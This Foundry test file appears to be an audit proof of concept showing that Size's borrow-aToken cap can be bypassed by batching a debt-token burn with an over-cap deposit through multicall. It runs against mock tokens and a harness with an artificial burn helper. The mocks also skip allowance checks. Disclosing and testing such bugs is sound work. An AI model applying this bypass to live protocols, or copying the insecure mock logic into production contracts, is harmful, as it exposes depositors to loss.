pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

import "src/Size.sol";
import {DepositParams} from "src/libraries/actions/Deposit.sol";

import {IBorrowAToken} from "src/interfaces/IBorrowAToken.sol";
import {IDebtToken} from "src/interfaces/IDebtToken.sol";
import {IPool} from "src/interfaces/external/aave/IPool.sol";

/*//////////////////////////////////////////////////////////////
                 Minimal test-side mock contracts
//////////////////////////////////////////////////////////////*/

contract FakeERC20 is ERC20 {
    uint8 private immutable _decimals;

    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) {
        _decimals = d;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    /* Convenience mint for tests */
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /* Disable allowance logic for simplicity – always succeed */
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        return true;
    }
}

/* Borrow aToken used by the protocol */
contract FakeBorrowAToken is FakeERC20, IBorrowAToken {
    constructor() FakeERC20("fakeBorrowAToken", "fbA", 18) {}

    function mintScaled(address to, uint256 amount) external override {
        _mint(to, amount);
    }
}

/* Debt token used by the protocol */
contract FakeDebtToken is FakeERC20, IDebtToken {
    constructor() FakeERC20("fakeDebtToken", "fDebt", 18) {}

    function burnScaled(address from, uint256 amount) external override {
        _burn(from, amount);
    }
}

/* AToken returned from variable pool reserve data */
contract FakeAToken is FakeERC20 {
    constructor() FakeERC20("fakeAToken", "fA", 18) {}

    /* Same semantics as mintScaled in aTokens */
    function mintScaled(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function scaledBalanceOf(address user) external view returns (uint256) {
        return balanceOf(user);
    }
}

/* Extremely thin mock of Aave IPool used only by Size.deposit() */
contract FakeVariablePool {
    address public immutable aToken;

    constructor(address _aToken) {
        aToken = _aToken;
    }

    /* ReserveData with only the aToken pointer populated */
    struct ReserveData {
        address aTokenAddress;
    }

    function getReserveData(address) external view returns (ReserveData memory data) {
        data.aTokenAddress = aToken;
    }

    /* Mint scaled aTokens to the receiver.  Other params ignored. */
    function supply(
        address,
        uint256 amount,
        address onBehalfOf,
        uint16
    ) external {
        FakeAToken(aToken).mintScaled(onBehalfOf, amount);
    }
}

/*//////////////////////////////////////////////////////////////
                         Testing harness
//////////////////////////////////////////////////////////////*/

contract SizeHarness is Size {
    /* Directly configure the minimal state we need for the PoC */
    function harnessInit(
        address underlyingBorrowToken_,
        address borrowAToken_,
        address debtToken_,
        address underlyingCollateralToken_,
        address variablePool_,
        uint128 borrowATokenCap_
    ) external {
        // Populate the state struct
        state.data.underlyingBorrowToken = IERC20(underlyingBorrowToken_);
        state.data.borrowAToken = IBorrowAToken(borrowAToken_);
        state.data.debtToken = IDebtToken(debtToken_);
        state.data.underlyingCollateralToken = IERC20(underlyingCollateralToken_);
        state.data.variablePool = IPool(variablePool_);
        state.riskConfig.borrowATokenCap = borrowATokenCap_;

        // Give the test contract full permissions so that role checks pass
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(PAUSER_ROLE, msg.sender);
        _setupRole(KEEPER_ROLE, msg.sender);
        _setupRole(BORROW_RATE_UPDATER_ROLE, msg.sender);
    }

    /* Helper executed via multicall to synthetically decrease debtToken supply */
    function harnessBurnDebtTokens(uint256 amount) external {
        state.data.debtToken.burnScaled(msg.sender, amount);
    }

    /* Expose the cap for assertions */
    function borrowATokenCap() external view returns (uint128) {
        return state.riskConfig.borrowATokenCap;
    }
}

/*//////////////////////////////////////////////////////////////
                         Exploit Test
//////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    SizeHarness            internal size;
    FakeBorrowAToken       internal borrowAToken;
    FakeDebtToken          internal debtToken;
    FakeERC20              internal underlyingBorrowToken;
    FakeERC20              internal underlyingCollateralToken;
    FakeVariablePool       internal variablePool;
    FakeAToken             internal aToken;

    /* Convenience constants (use 18-decimals throughout) */
    uint256 constant INITIAL_BORROW_SUPPLY = 980 ether;    // below cap
    uint256 constant CAP                    = 1_000 ether; // protocol cap
    uint256 constant DEPOSIT_AMOUNT         = 50  ether;   // pushes supply above cap
    uint256 constant BURN_DEBT_AMOUNT       = 10  ether;   // debt decrease < supply increase

    function setUp() public {
        /* Deploy mocks */
        borrowAToken            = new FakeBorrowAToken();
        debtToken               = new FakeDebtToken();
        underlyingBorrowToken   = new FakeERC20("fakeUSDC", "fUSDC", 6);
        underlyingCollateralToken = new FakeERC20("fakeWETH", "fWETH", 18);
        aToken                  = new FakeAToken();
        variablePool            = new FakeVariablePool(address(aToken));

        /* Deploy and minimally initialise Size */
        size = new SizeHarness();
        size.harnessInit(
            address(underlyingBorrowToken),
            address(borrowAToken),
            address(debtToken),
            address(underlyingCollateralToken),
            address(variablePool),
            uint128(CAP)
        );

        /* Seed protocol state to just below the cap */
        borrowAToken.mint(address(this), INITIAL_BORROW_SUPPLY);
        debtToken.mint(address(this), 200 ether); // arbitrary starting debt supply

        /* Give Size contract an allowance to pull tokens in deposit() */
        underlyingBorrowToken.mint(address(this), DEPOSIT_AMOUNT);
        underlyingBorrowToken.approve(address(size), DEPOSIT_AMOUNT);

        /* Also approve debt token burn so `harnessBurnDebtTokens` can pull */
        debtToken.approve(address(size), type(uint256).max);
    }

    /*----------------------------------------------------------
        1. Show that a direct deposit exceeding the cap reverts
    ----------------------------------------------------------*/
    function testDirectDepositFailsDueToCap() public {
        DepositParams memory p = DepositParams({
            token:  address(underlyingBorrowToken),
            to:     address(this),
            amount: DEPOSIT_AMOUNT
        });

        vm.expectRevert(); // Any revert proves cap enforcement
        size.deposit(p);
    }

    /*----------------------------------------------------------
        2. Exploit: same deposit batched with a small debt burn
           through Size.multicall succeeds even though it still
           violates the intended invariant:
           borrowATokenIncrease > debtTokenDecrease
    ----------------------------------------------------------*/
    function testMulticallBypassesBorrowCap() public {
        /* Build calldata for the two batched calls                  *
         *  (1) shrink debt token supply                             *
         *  (2) perform the over-cap deposit                         */
        bytes[] memory calls = new bytes[](2);

        /* call (1) Size.harnessBurnDebtTokens(uint256) */
        calls[0] = abi.encodeWithSelector(
            size.harnessBurnDebtTokens.selector,
            BURN_DEBT_AMOUNT
        );

        /* call (2) Size.deposit(DepositParams) */
        calls[1] = abi.encodeWithSelector(
            size.deposit.selector,
            DepositParams({
                token:  address(underlyingBorrowToken),
                to:     address(this),
                amount: DEPOSIT_AMOUNT
            })
        );

        /* Execute the batch – SHOULD revert, but doesn’t due to the bug */
        size.multicall(calls);

        /* ------------------- Post-conditions -------------------- */

        /* 1. borrowAToken supply is now above the configured cap  */
        uint256 finalBorrowSupply = borrowAToken.totalSupply();
        assertGt(finalBorrowSupply, CAP);

        /* 2. Increase in borrowAToken supply larger than debt decrease */
        uint256 borrowIncrease = finalBorrowSupply - INITIAL_BORROW_SUPPLY;
        uint256 finalDebtSupply = debtToken.totalSupply();
        uint256 debtDecrease   = 200 ether - finalDebtSupply;

        assertGt(borrowIncrease, debtDecrease);

        /* 3. The transaction succeeded - invariant broken */
        emit log_named_uint("Borrow aToken supply increase", borrowIncrease);
        emit log_named_uint("Debt token supply decrease   ", debtDecrease);
    }
}